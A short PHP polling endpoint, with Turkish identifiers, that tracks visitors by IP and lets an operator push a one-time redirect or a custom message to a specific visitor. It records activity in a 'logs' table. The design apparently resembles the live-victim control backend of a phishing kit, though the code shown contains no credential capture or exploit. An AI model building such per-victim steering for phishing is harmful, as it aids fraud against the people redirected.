<?php
require 'inc/brain.php';

$input = json_decode(file_get_contents('php://input'), true);
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

if (!$ip) {
    echo json_encode(['status' => 'error', 'message' => 'IP alınamadı']);
    exit;
}

$timestamp = time();
$stmt = $pdo->prepare("INSERT INTO ziyaretciler (ip_address, last_seen) VALUES (?, ?)
                       ON DUPLICATE KEY UPDATE last_seen = ?");
$stmt->execute([$ip, $timestamp, $timestamp]);

if (!empty($input['ozel_mesaj_gosterildi'])) {
    $mesaj = $input['ozel_mesaj_gosterildi'];
    $stmt = $pdo->prepare("UPDATE ozel_mesajlar SET gosterildi = 1 WHERE ip_address = ? AND mesaj = ? AND gosterildi = 0");
    $stmt->execute([$ip, $mesaj]);
    echo json_encode(['status' => 'ok']);
    exit;
}

$stmt_logs = $pdo->prepare("UPDATE logs SET aktif_check = ? WHERE ip_address = ?");
$stmt_logs->execute([$timestamp, $ip]);



$stmt = $pdo->prepare("SELECT target_url FROM redirect_targets WHERE ip_address = ?");
$stmt->execute([$ip]);
$redirect = $stmt->fetchColumn();
if ($redirect) {
    $pdo->prepare("DELETE FROM redirect_targets WHERE ip_address = ?")->execute([$ip]);
    echo json_encode(['redirect' => $redirect]);
    exit;
}


$stmt = $pdo->prepare("SELECT mesaj FROM ozel_mesajlar WHERE ip_address = ? AND gosterildi = 0 ORDER BY created_at DESC LIMIT 1");
$stmt->execute([$ip]);
$ozelMesaj = $stmt->fetchColumn();

$response = ['status' => 'ok'];
if ($ozelMesaj) {
    $response['ozel_mesaj'] = $ozelMesaj;
}

echo json_encode($response);